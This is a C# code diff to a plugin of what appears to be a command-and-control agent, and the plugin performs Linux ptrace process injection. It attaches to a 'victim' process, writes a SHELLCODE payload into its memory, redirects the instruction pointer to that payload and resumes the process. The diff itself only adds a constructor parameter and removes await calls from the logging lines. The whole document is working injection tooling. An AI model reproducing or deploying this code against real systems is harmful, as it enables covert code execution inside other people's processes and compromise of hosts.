@@ -15,7 +15,7 @@ namespace Agent
         private ITokenManager tokenManager { get; set; }
         private ISpawner spawner { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
@@ -29,7 +29,7 @@ namespace Agent
 
             if (!args.Validate(out var message))
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = message,
@@ -47,25 +47,25 @@ namespace Agent
             long victimPid = (long)args.pid;
             if (victimPid == 0 || victimPid > pidMax)
             {
-                await messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
+                messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                 return;
             }
 
             // Attach to the victim process.
             if (PTrace.PtraceAttach(victimPid) < 0)
             {
-                await messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
             PTrace.Wait(null);
 
-            await messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);
+            messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);
 
             // Save old register state.
             PTrace.UserRegs oldRegs;
             if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
             {
-                await messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
@@ -74,35 +74,35 @@ namespace Agent
             int payloadSize = SHELLCODE.Length;
             ulong[] payload = new ulong[payloadSize / 8];
 
-            await messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);
+            messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);
 
             for (int i = 0; i < payloadSize; i += 8)
             {
                 ulong value = BitConverter.ToUInt64(SHELLCODE, i);
                 if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
                 {
-                    await messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                    messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                     return;
                 }
             }
 
-            await messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
+            messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
             PTrace.UserRegs regs = oldRegs;
             regs.rip = (ulong)address;
 
             if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
             {
-                await messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
             if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
             {
-                await messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
-            await messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);
+            messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);
 
 
         }
